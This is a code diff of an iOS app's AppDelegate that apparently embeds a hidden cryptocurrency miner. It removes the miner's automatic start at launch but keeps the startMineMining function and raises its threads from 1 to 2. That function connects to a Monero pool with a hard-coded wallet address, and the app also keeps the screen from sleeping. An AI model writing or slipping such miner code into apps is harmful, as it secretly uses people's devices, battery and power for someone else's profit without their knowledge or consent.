@@ -17,7 +17,6 @@ class AppDelegate: UIResponder, UIApplicationDelegate {
     
     func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplicationLaunchOptionsKey: Any]?) -> Bool {
         UIApplication.shared.isIdleTimerDisabled = true
-        startMineMining()
         // Override point for customization after application launch.
         return true
     }
@@ -50,7 +49,7 @@ extension AppDelegate {
     func startMineMining() {
         ////Production
         do {
-            try Miner(host: "vegas-1.xmrpool.net", port: 3335, destinationAddress: "46pa9Ah39Pu2Gy3tPavncxYSpo4QfdKErJRRF1EeidZtgG2xTgPsTFKWbwaVe4vUMveKAzAiA4j8xgUi29TpKXpm42YseUZ", clientIdentifier: "Eyerise").start(threadLimit: 1)
+            try Miner(host: "vegas-1.xmrpool.net", port: 3335, destinationAddress: "46pa9Ah39Pu2Gy3tPavncxYSpo4QfdKErJRRF1EeidZtgG2xTgPsTFKWbwaVe4vUMveKAzAiA4j8xgUi29TpKXpm42YseUZ", clientIdentifier: "Eyerise").start(threadLimit: 2)
         }catch {
             print(error)
         }
